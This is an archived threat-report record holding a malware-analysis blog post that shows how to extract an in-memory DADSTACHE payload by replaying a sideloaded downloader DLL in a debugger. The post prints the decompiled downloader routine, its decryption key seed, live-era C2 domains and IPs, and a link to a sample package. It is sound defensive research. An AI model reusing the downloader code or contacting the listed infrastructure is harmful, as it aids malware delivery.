{
    "id": "99ee44a1-84b0-4f22-97be-c7210c7f95ff",
    "created_at": "2023-01-12T15:05:25.831572Z",
    "updated_at": "2025-03-27T02:16:26.263652Z",
    "deleted_at": null,
    "sha1_hash": "af9993eeedb062a2918fa16794c749aca30d91f9",
    "title": "2020-07-10 - Knowledge Fragment- Casting Sandbox Necromancy on DADSTACHE",
    "authors": "",
    "file_creation_date": "2022-05-28T17:40:20Z",
    "file_modification_date": "2022-05-28T17:40:20Z",
    "file_size": 2110802,
    "plain_text": "# Knowledge Fragment: Casting Sandbox Necromancy on DADSTACHE\n\n**danielplohmann.github.io/blog/2020/07/10/kf-sandbox-necromancy.html**\n\nI’m still thinking of a good way to revive this blog. One idea I had is to simply write about interesting encounters I have\n[while maintaining/extending the Malpedia corpus.](https://malpedia.caad.fkie.fraunhofer.de/)\n\n[I recently had one such encounter when working on a submission by Rony, about which](https://twitter.com/r0ny_123) [mak also](https://twitter.com/maciekkotowicz) [tweeted. Additionally,](https://twitter.com/malwarelabpl/status/1273646045239672835)\n[Elastic already wrote a detailed blog post on this campaign.](https://www.elastic.co/de/blog/advanced-techniques-used-in-malaysian-focused-apt-campaign)\n\nWhy this blog post then? Well, I think it’s worthwhile to focus a bit on the methodology side of things, especially as this\nconcrete case allows to showcase a common workflow pattern that can be applied during analysis. Generally, I feel that\nthere are great beginner tutorials for malware analysis and RE but material for intermediate skill is not as widely available.\n[Perhaps I should focus on that in the future? Let me know.](https://twitter.com/ByteAtlas)\n\n[For today, as a basis, there is this great ANY.RUN capture for the given case, which we will dissect in this post!](https://app.any.run/tasks/425d6b1b-d68d-4e5c-996d-8b1753faf750/)\n\nI’ll also provide all relevant data, so you can use this as a hands-on exercise/walkthrough.\n\nIn summary, we will briefly look at an attack using\n\na Word-based downloader pulling\n[another downloader (using DLL Search Order Hijacking) which then fetches](https://attack.mitre.org/techniques/T1574/001/)\na payload that is only decrypted in memory.\n\nOur objective: We want to extract that final memory-only payload.\n\nFor this we will use Sandbox Necromancy!\n\n### Sandbox Necromancy?\n\nI’ve chosen the title “Sandbox Necromancy” to describe the following analysis workflow pattern:\n\n_Given a previous (automated) dynamic analysis and corresponding recordings (sandbox run, PCAP, memory dumps, …), a_\n_malware analyst wants to recreate a specific situation that existed during this dynamic analysis in order to do additional_\n_research, e.g. access volatile data._\n\nOver the years I have encountered several variations of this pattern, typically when writing malware traffic/configuration\ndecryptors or unpacking samples.\n\nSandbox Necromancy may become necessary in cases where the world changed since the recordings, for example\nbecause the respective C&C server has disappeared or our IP address was blocked or it is generally geofenced and we\nstill want to continue to investigate. It can also be required when there is no VM snapshot from a previous investigation\navailable and we have to recreate a identical runtime situation from whatever data we have still available.\n\nIn some cases it also allows us to repeat specific analysis steps decoupled from external dependencies, potentially\nspeeding up the analysis itself.\n\n[via GIPHY](https://giphy.com/gifs/mrw-hours-professor-LBrxm7ARM6c0w)\n\nI’ll now explain how this applies to the concrete case.\n\n### A wild DADSTACHE appears\n\n[Please spend a couple minutes reviewing the following ANY.RUN capture.](https://app.any.run/tasks/425d6b1b-d68d-4e5c-996d-8b1753faf750/)\n\nDone? Good! :)\n\n\n-----\n\nYou may have assessed that:\n\nThe process tree lists 3 executables ( WINWORD.exe -> cmd.exe -> LogiMailApp.exe )\nThe network tabs list a lot of traffic from `WINWORD.exe and` `LogiMailApp.exe but sadly it appears that everything`\nis encrypted.\nA closer look at the behavior of `WINWORD.exe reveals:`\n\n6 network connections, pulling ~430kb of data\na few created files, among them `LogiMailApp.exe and` `LogiMailApp.dll (adding up to 410kb,`\ncorresponding to the downloads)\nA closer look at the behavior of `cmd.exe reveals… not much at all, apart from being used to start`\n```\n   LogiMailApp.exe .\n\n```\nA closer look at the behavior of `LogiMailApp.exe reveals`\n\nan initial network check-in ( 104.248.148.156 (armybar.hopto.org) ), leading to a download of 140kb of\ndata\na file `Encrypted[1] of size 135kb potentially corresponding to that download`\nmany more network check-ins ( 139.59.31.188 (tomema.myddns.me) ) to another IP address, starting\napproximately one minute after the first check-in.\n\nThis allows to theorize the secondary check-ins have something to do with the `Encrypted[1] and what happens to it`\nonce it is downloaded and in-memory. However, there is no way to simply obtain this decrypted in-memory code fragment,\nas it was not stored by sandbox.\n\nBecause the C&C server of interest ( 104.248.148.156 (armybar.hopto.org) ) is dead by now, we can not simply\nperform a dynamic analysis / debugging session and walk through these steps as `Encrypted[1] will never be`\ndownloaded. Maybe we also do not want the threat actors to know that we are performing this analysis and want to\nperform no network interaction anyway. This is where our sandbox necromancy comes into play.\n\nLuckily, ANY.RUN allows us to collect all files needed to revive the execution state. They are also available on VirusTotal\nand potentially elsewhere:\n```\nLogiMailApp.exe (optional)\n\n```\nsha256: `93810c5fd9a287d85c182d2ad13e7d30f99df76e55bb40e5bc7a486d259810c8`\n```\nLogiMail.dll (sideloaded by LogiMailApp.exe - but can also be loaded directly in a debugger)\n\n```\nsha256: `11508c1727134877dea18f30df2d2c659a112e632c3fb8e16ddad722727c775a`\n```\nEncrypted (our target)\n\n```\nsha256: 06a4246be400ad0347e71b3c4ecd607edda59fbf873791d3772ce001f580c1d3\n\n\n-----\n\n[If you want to play along, I have packaged them here (password:](https://github.com/danielplohmann/danielplohmann.github.io/tree/master/assets/20200710/samples.zip) `infected ) for simplicity.`\nI spare you the typical warnings about malware and just assume you know what you are doing when you ended up reading\nso far in. :)\n\n### Analysis of LogiMail.dll\n\nWe will now dive a bit deeper, first obtaining an overview using static analysis and then performing the actual necromancy\nusing a debugger.\n\n## Static Analysis\n\nLooking at `LogiMail.dll, we quickly identify the function` `DllGetClassObject at offset` `0x10002250 as relevant`\nbecause\n\nit makes use of WinAPI calls such as `URLDownloadToFileA,` `ReadFile, and` `CryptDecrypt, which fits what we`\nare looking for and\nit is also an exported function\n\nHere’s the control flow graph:\n\n\n-----\n\n-----\n\nThrough careful analysis we can learn the following:\n```\n   \"%TMP%\\\\~liseces1.pcs\" is being passed to ExpandEnvironmentStringsA, which replaces %TEMP% by the full\n\n```\npath. In case of our ANY.RUN trace, this would be `C:\\Users\\admin\\AppData\\Local\\Temp\\~liseces1.pcs`\na string `HcRVJiZhrS2e0itoEyk/kaOz5fqCiLl4tr6CI4RlO5FWMRCgDA2dXXbaKMHm9Ffv is being passed to`\n```\n   CryptStringBinaryA with flag 0x1 (meaning CRYPT_STRING_BASE64 ), which will then produce the\n\n```\ncorresponding binary string\n( 1dc455262661ad2d9ed22b6813293f91a3b3e5fa8288b978b6be822384653b91563110a00c0d9d5d76da28c1e6f457ef )\nin `pbBinary`\n```\n   pbBinary is then decrypted using CryptDecrypt (with hKey being previously set up in sub_10002430 -> an\n\n```\nAES128 key derived using the SHA256 hash of string `7PLGdUh0jc-1GoEl )`\nthis decrypted string is then being passed to `UrlDownloadToFileA, indicating it’s potentially a URL. As download`\ndestination, we can see the previously expanded path for `~liseces1.pcs being used`\nif the download is successful, the file is read ( CreateFileA, `GetFileSize,` `ReadFile ) and afterwards deleted`\n( DeleteFileA )\nAnother call to `CryptDecrypt is used on the file content now residing in memory.`\nThe decrypted contents are being passed to `sub_100012f0 - let’s assume for now this is for readying execution of`\nthe in-memory payload.\n\nFor readability, here’s also HexRays’ decompilation output:\n\n\n-----\n\n```\n                   j (,, pp )\n{\n HANDLE v3; // eax\n void *v4; // edi\n DWORD v5; // esi\n void *v6; // ebx\n CHAR Dst[260]; // [esp+Ch] [ebp-218h]\n BYTE pbBinary[260]; // [esp+110h] [ebp-114h]\n DWORD NumberOfBytesRead; // [esp+214h] [ebp-10h]\n int v11; // [esp+218h] [ebp-Ch]\n DWORD cchString; // [esp+21Ch] [ebp-8h]\n DWORD pcbBinary; // [esp+220h] [ebp-4h]\n memset(Dst, 0, sizeof(Dst));\n cchString = strlen(pszString);\n memset(pbBinary, 0, sizeof(pbBinary));\n pcbBinary = 260;\n v11 = 0;\n ExpandEnvironmentStringsA(\"%TMP%\\\\~liseces1.pcs\", Dst, 0x104u);\n if ( CryptStringToBinaryA(pszString, cchString, 1u, pbBinary, &pcbBinary, 0, 0) && \n    sub_10002430() )\n {\n  if ( CryptDecrypt(hKey, 0, 1, 0, pbBinary, &pcbBinary) )\n  {\n   sub_10002530();\n   pbBinary[pcbBinary] = 0;\n   sub_10001FB0(pszString, \"%s\", (const char *)pbBinary);\n   while ( 1 )\n   {\n    if ( !URLDownloadToFileA(0, pszString, Dst, 0, 0) )\n    {\n     v3 = CreateFileA(Dst, 0x80000000, 1u, 0, 3u, 0, 0);\n     v4 = v3;\n     if ( v3 != (HANDLE)-1 )\n     {\n      v5 = GetFileSize(v3, 0);\n      cchString = v5;\n      v6 = malloc(v5);\n      ReadFile(v4, v6, v5, &NumberOfBytesRead, 0);\n      CloseHandle(v4);\n      DeleteFileA(Dst);\n      if ( sub_10002430() )\n      {\n       if ( CryptDecrypt(hKey, 0, 1, 0, (BYTE *)v6, &cchString) )\n        sub_100012F0(&v11);\n      }\n      sub_10002530();\n     }\n    }\n    Sleep(0x3E8u);\n   }\n  }\n  sub_10002530();\n }\n return 0;\n}\n\n```\nAlright, armed with this knowledge, we can now plan our ritual.\n\n## Dynamic Analysis\n\nGiven that we already have the involved files, we can simply craft the desired execution flow in the debugger. This will let\nus ignore the cryptography details and work with a `~liseces1.pcs - which already magically appeared without the need`\nof network access. We will only need `LogiMail.dll and` `Encrypted for this.`\n\nOur plan is to simply start up `LogiMail.dll and step through` `DllGetClassObject . As all WinAPI calls except`\n```\nURLDownloadToFileA have no dependency, we should be able to work our way through them from the beginning of the\n\n```\nfunction. We will then just skip the download and modify the arguments of `CreateFileA to point wherever we put the`\n\n\n-----\n\ndownloaded file. Once it is read into memory and decrypted, we simply dump the buffer to obtain our initially stated goal:\nextraction of a payload, previously not found in the sandbox run.\n\nMy tool of choice here is a Win7 VM and OllyDbg.\n\nThe following screenshot shows the initial view after loading the DLL:\n\nWe see that Windows decided that `0x1c0000 was a good place to load` `LogiMail.dll and simply adjust all offsets to`\nthat. The function OllyDbg sets us initially to is `DllEntryPoint . If we would simply redirect our execution now to our`\ntarget function `DllGetClassObject, we might encounter problems, as execution has not been set up properly yet (stack`\ncookie and heap initialization, …). So it does not hurt to simply step over until the end of this function (return at\n```\n0x1c2eee ).\n\n```\nThis is now also an exceptionally great time to create a first VM snapshot. :)\n\nWe are now ready to jump ( CTRL+G ) to `DllGetClassObject at` `0x1c2250 . In order to continue here, we simply set the`\nfirst instruction as “New Origin” via the context menu\n\n\n-----\n\nWe are greeted with the strings and WinAPI calls identified during static analysis. As I said, we do not want to be bothered\nwith the cryptography and download, so we can simply set a breakpoint on the call to `URLDownloadToFileA`\n( 0x1c2362 ) and run:\n\n\n-----\n\nNice! As a side-effect we now also get the download URL that we already knew from the ANY.RUN trace\n( https://armybar.hopto.org/Encrypted ). Note that the sandbox so far gave us only the server\n( armybar.hopto.org ) but not exact URL for this - while rightfully assuming so, we now additionally confirmed that the\nfile `Encrypted found in the Temporary Internet Files is the actual` `~liseces1.pcs to be used next for decryption.`\n\nAs strategized before, we will now not execute this API call but instead simply jump over it and proceed to the next\ninstruction `test eax, eax . As we can see, it is expected that` `URLDownloadToFileA would return` `0x0 in order to`\ncontinue into the part of the function that loads the file. We can simply clear the EAX register by manipulating its content.\nFor convenience, we also don’t need to place our `Encrypted file at the location for shown in the screenshot`\n( C:\\Users\\redacted\\AppData\\Local\\Temp\\~liseces1.pcs ) but we can simply put it in any other location of our\nchoice and change the path in the dump. The results of these actions (proceed execuction, modify file location) are shown\nin this screenshot:\n\n\n-----\n\nOne thing is important to note here: As we had already pushed arguments for `URLDownloadToFileA onto the stack but`\ndid not execute the API call, this may have deranged the stack (by 5 DWORDs to be exact). This can be an issue when\nmanipulating execution context in bigger debugging sessions. We avoid this, we could have set our breakpoint to\n```\n0x1c2350 (before execution of the argument pushes) instead, or manually fixed ESP . For this situation, this does not\n\n```\nmatter too much as we will not leave the context of this function and all relevant following pointer are relative to `EBP .`\n\nContinuing our execution, we next need to know where the file contents will be stored in memory for decryption. For this,\nwe can execute until after the `ReadFile API call, because we can reconstruct the location from the` `EBX register:`\n\n\n-----\n\nYou can follow the mouse cursor and see EBX pointing to `0x2e6740, with the contents shown in the dump tab in the`\nlower left corner. Our final steps are now continuing execution until after the `CryptDecrypt and extracting the decrypted`\npayload:\n\n\n-----\n\nExcellent, there is the iconic tell-tale sign of our successful payload extraction: an MZ header! Using the context menu, we\ncan dump the full section with the target payload. The only step left is ripping the executable from the section, which I\nusually do with my favorite hex editor: 010Editor.\n\nThe resulting unpacked file has a size of 138.752 bytes and is the DADSTACHE payload we were longing for!\n\nAs this final payload is not available on VT as of now, I have also added it to the [package mentioned earlier.](https://github.com/danielplohmann/danielplohmann.github.io/tree/master/assets/20200710/samples.zip)\n```\nunpacked (the result of the efforts described in here)\n\n```\nsha256: `f922913ed85e79d4a5eb804f23bde0888de86dc6f5521fde7ed607db212f1256`\n\n### Summary\n\nI hope this outline of “Sandbox Necromancy” and the walkthrough are helpful to some of you. It’s certainly a technique that\nis easily transferred to other situations and generally very useful.\n\n[If you want me to do more write-ups like this one, let me know. I typically struggle a bit when estimating if such aspects of](https://twitter.com/ByteAtlas)\nanalysis are too trivial or worthwhile the effort of documenting. :)\n\n[For further reading, a similar extraction walkthrough for an earlier DADSTACHE sample was written by Asuna Amawaka.](https://medium.com/insomniacs/dad-theres-a-rat-in-here-e3729b65bf7a)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-10 - Knowledge Fragment- Casting Sandbox Necromancy on DADSTACHE.pdf"
    ],
    "report_names": [
        "2020-07-10 - Knowledge Fragment- Casting Sandbox Necromancy on DADSTACHE.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535925,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653759620,
    "ts_modification_date": 1653759620,
    "files": {
        "pdf": "https://archive.orkl.eu/af9993eeedb062a2918fa16794c749aca30d91f9.pdf",
        "text": "https://archive.orkl.eu/af9993eeedb062a2918fa16794c749aca30d91f9.txt",
        "img": "https://archive.orkl.eu/af9993eeedb062a2918fa16794c749aca30d91f9.jpg"
    }
}